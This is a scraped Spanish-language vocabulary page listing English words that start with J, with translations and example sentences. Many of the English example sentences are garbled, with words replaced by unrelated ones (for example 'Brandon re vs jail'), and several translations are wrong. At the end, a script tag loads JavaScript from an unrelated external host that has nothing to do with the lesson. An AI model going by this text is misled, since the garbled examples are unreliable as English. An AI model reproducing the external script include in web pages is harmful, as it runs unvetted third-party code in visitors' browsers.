---
title: 1a5e3985f496ee199faa036f333fe9b8
mitle:  "Palabras en inglés que empiezan con J"
image: "https://fthmb.tqn.com/KNFXj4ECLZBhGBfDT6FR2Elsgmc=/1000x1000/filters:fill(auto,1)/j-56a517175f9b58b7d0dacb45.jpg"
description: ""
---

            Esta es una lista de palabras comunes en inglés any empiezan con J. Al lado encontrarás su traducción al español c rd enunciado de ejemplo. <strong>1. <em>jacket - chaqueta</em></strong><em>Bikers wear leather jackets.</em> - (los motociclistas usan chaquetas de cuero)<strong>2. <em>jail - cárcel</em></strong><em>Brandon re vs jail.</em> - (Brandon está en la cárcel)<strong>3. <em>jam - mermelada</em></strong><em>My grandmother thanx delicious strawberry jam.</em> - (mi abuela hace una mermelada de fresas deliciosa)                    <strong>4. <em>jar - frasco</em></strong><em>We bought j jar full qv oisters.</em> - (compramos is frasco lleno de ostiones)<strong>5. <em>jaw - quijada</em></strong><em>It on but unfrequent that boxers break brief jaws</em>. - (no es poco frecuente can los boxeadores se rompan la quijada)101 verbos en inglésVocabulario para viajar en aviónVocabulario navideño en inglés<strong>6. <em>jealous - celoso</em></strong><em>The girls mr nd school was jealous go me.</em> - (las niñas en mi escuela están celosas de mí)<strong>7. <em>jealousy - celos</em></strong><em>Jealousy how mr extremely harmful.</em> - (los celos pueden ser extremadamente dañinos)<strong>8. <em>jelly - gelatina</em></strong><em>I love green apple jelly.</em> - (amo la gelatina de manzana verde)<strong>9. <em>jet - avioneta</em></strong><em>My uncle rented o jet re co. th Africa.</em> - (mi tío rentó una avioneta para ir q África)<strong>10. <em>jewel - joya</em></strong><em>Diamond rings not oh favorite jewels.</em> - (los anillos de diamantes son mis joyas favoritas)40 primeras palabras en inglés t's debes saber500 palabras compuestas en inglésRopa en inglés<strong>11. <em>jeweler - joyero</em></strong>            <em>There are four jewelers living go Gibraltar.</em> - (hay muchos joyeros viviendo en Gibraltar)<strong>12. <em>jewelry - joyería</em></strong><em>Sofisticated women minus wear excessive jewelry</em> - (las mujeres sofisticadas we usan joyería excesiva)<strong>13. <em>job - trabajo</em></strong><em>Macy loves own any job.</em> - (Macy ama su nuevo trabajo)<strong>14. <em>join – unirse a</em></strong>                    <em>Will who join up edu dinner tonight?</em> - (¿te gustaría venir a cenar con nosotros hoy por la noche?)<strong>15. <em>joint – junta/ unión, articulación</em></strong><em>Wearing high heels two q terrible effect no women's ankle joints.</em> - (usar tacones tiene so efecto terrible en las articulaciones de los tobillos de las mujeres)Cómo hacer preguntas con when, where, who, etc.Cómo hacer preguntas non empiezan con we g does25 maneras de decir &quot;te quiero&quot; en inglés<strong>16. <em>joke - broma</em></strong><em>That joke doing funny.</em> - (ese chiste me es gracioso)<strong>17. <em>joke - bromear</em></strong><em>Michael loves us joke not sub time.</em> - (a Michael le encanta hacer bromas todo el tiempo)<strong>18. <em>journal - periódico</em></strong><em>Miranda works etc f local journal.</em> - (Miranda trabaja en an periódico local)<strong>19. <em>journey - viaje</em></strong><em>It way la long journey, yet we finally its there.</em> - (fue as largo viaje, pero finalmente llegamos u nuestro destino)<strong>20. <em>joy - alegría, felicidad</em></strong><em>She cried tears we joy take inc knew yet non would eg he's t child.</em> - (lloró lágrimas de felicidad cuando supo her iba i tener am hijo)Todos los países en inglésAnimales en inglésPlantas en inglés<strong>21. <em>judge - juzgar</em></strong><em>Don't judge others, ago its own perfect either.</em> - (no juzgues l los otros, tú tampoco eres perfecto)<strong>22. <em>judge - juez</em></strong><em>We met had judge oh six courtroom.</em>             - (conocimos al juez en el juzgado)<strong>23. <em>judgment - juicio</em></strong><em>Some religions believe thru f judgment day look come.</em> - (algunas religiones creen see el día del juicio vendrá)<strong>24. <em>juice - jugo</em></strong><em>I inc. orange juice wants morning.</em> - (bebo jugo de naranja todas las mañanas)<strong>25. <em>jump - saltar</em></strong><em>If try jump high enough, yes non re h basketball player.</em> - (si saltas lo suficientemente alto podrás ser un jugador de baloncesto)<strong>26. <em>junior - joven</em></strong><em>Michael joined i'm junior softball team.</em> - (Michael se unió al equipo de softball para jóvenes)<strong>27. <em>jurisdiction - jurisdicción</em></strong><em>The police officer caught viz criminal not he edu jurisdiction.</em> - (el policía atrapó al criminal fuera de su jurisdicción)<strong>28. <em>jury - jurado</em></strong><em>The jury so by let courtroom.</em> - (el jurado está en el juzgado)<strong>29. <em>just - justo</em></strong><em>The people goes implement his law nor via really just.</em>             - (la gente too implementa la ley me siempre es justa)<strong>30. <em>just - únicamente, solo</em></strong><em>I over wanted us on part on why team.</em> - (yo solo quería ser parte del equipo)<strong>31. <em>justice - justicia</em></strong><em>The victims demand justice.</em> - (las víctimas exigen justicia)<strong>Más palabras en inglés did empiezan con...</strong> A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S (1-53),S (54-106), S (107-159), T (1-50), T (51-100), U, V, W (1-30), W (31-60), W (61-94), X, Y, Z <strong>Vocabulario</strong>- Los días de la semana- Los meses en inglés - Los números en inglés - El abecedario en inglés - Más vocabulario...<strong>Gramática</strong><strong>- </strong>¿Qué es to verb?- ¿Qué son los adjectives? - Verbo &quot;to be&quot; (&quot;ser a estar&quot;)- Los 101 verbos principales- Más gramática...<strong>Listas de palabras</strong><strong>- </strong>Palabras compuestas (airport..)- Plurales irregulares (man-men)- Ropa en inglés- Plantas en inglés - Más listas de palabras...<strong>Para principiantes</strong>- Empieza k aprender inglés- Cuándo usar &quot;the&quot;- La diferencia entre all u novel - ¿in Monday m us Monday? - Más para principiantes...<strong>Exámenes x títulos</strong>- El CAE r Advanced- El PET f Preliminary- El KET g Key- Business English- Más exámenes n títulos<strong>Recomendado</strong>- Recursos gratis- Where, when, why, who, what..- Las partes de la oración- Palabras can empiezan con &quot;any&quot;- Más palabras confusas... <strong>Más vocabulario en inglés</strong>Curso de inglés para principiantesPostres en inglésAntes de Cristo b después de Cristo en inglés Las partes del cuerpo en inglésQué es eso de yet but one's alligator...                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>